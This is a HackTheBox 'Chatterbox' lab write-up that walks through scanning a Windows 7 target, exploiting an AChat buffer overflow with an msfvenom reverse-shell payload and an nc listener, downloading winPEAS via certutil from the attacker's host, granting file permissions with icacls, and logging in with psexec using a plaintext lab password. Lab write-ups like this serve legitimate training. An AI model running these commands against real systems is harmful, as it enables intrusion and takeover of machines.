---
title: "Chatterbox - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - Chatterbox
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - windows
toc: true
hide_title: true
excerpt: ""
---

## Chatterbox
![](https://kar0nx.github.io/assets/images/writeup/0d153f144af7b3b7213787c7e42df7d2.webp)

## Reconnaissance

IP: 10.10.10.74
### NMAP

```
nmap -T4 -A -p- 10.10.10.74
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 07:52 EST
Nmap scan report for 10.10.10.74
Host is up (0.032s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/7%OT=135%CT=1%CU=36666%PV=Y%DS=2%DC=T%G=Y%TM=67CA
OS:EC8C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%
OS:TS=7)SEQ(SP=104%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=2%
OS:ISR=106%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M5
OS:3CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000
OS:%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%C
OS:C=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=8
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-07T17:54:00
|_  start_date: 2025-03-07T17:37:00
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-07T12:53:59-05:00
|_clock-skew: mean: 6h39m31s, deviation: 2h53m13s, median: 4h59m30s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   30.68 ms 10.10.14.1
2   30.86 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
                                                                                 
```

Nmap shows some open port: 135 - rpc, 139, 445 - smb,  9255, 9256 - achat
Let's search for exploits for achat

```
searchsploit achat    
```

Remote Buffer Overflow
https://www.exploit-db.com/exploits/36025

## Gaining access

```
cp /usr/share/exploitdb/exploits/windows/remote/36025.py 3.py
```

let's adapt the exploit to our machine and make reverse shell

```
gedit 3.py
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250307135919.png)

in terminal:

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

in gedit replace "buf" lines with "buf" output lines form msfvenom
also change udp socket to our target machine:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250307142203.png)

set nc

```
nc -nvpl 443
```

and run script

```
python2 3.py
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250307142419.png)

we have shell. Now grab first flag  

```
type c:/users/alfred/desktop/user.txt
```

## Privilege Escalation

For manual we can use checklist

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

or we can use winpeas to enumerate:

```
python3 http.server 80
```

```
certutil -urlcache -f http://10.10.14.15/winPEASany.exe win.exe
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250307152226.png)

Winpeas show interesting information that Alfred have full access in c:\users\administrator
so we can use command 'icacls' and grab root flag very fast.

```
c:\Users\Administrator\Desktop>icacls .\*
icacls .\*
.\desktop.ini NT AUTHORITY\SYSTEM:(I)(F)
              CHATTERBOX\Administrator:(I)(F)
              BUILTIN\Administrators:(I)(F)
              CHATTERBOX\Alfred:(I)(F)

.\root.txt CHATTERBOX\Administrator:(F)

Successfully processed 2 files; Failed processing 0 files

c:\Users\Administrator\Desktop>icacls root.txt /grant CHATTERBOX\Alfred:(F)
icacls root.txt /grant CHATTERBOX\Alfred:(F)
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

c:\Users\Administrator\Desktop>type root.txt
```

We have root flag but not privilege.
For privilege we can connect to administrator account using psexec.py form Impacket library

```
psexec.py administrator@10.10.10.74
	password - Welcome1!
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250307153219.png)

And now we have root access.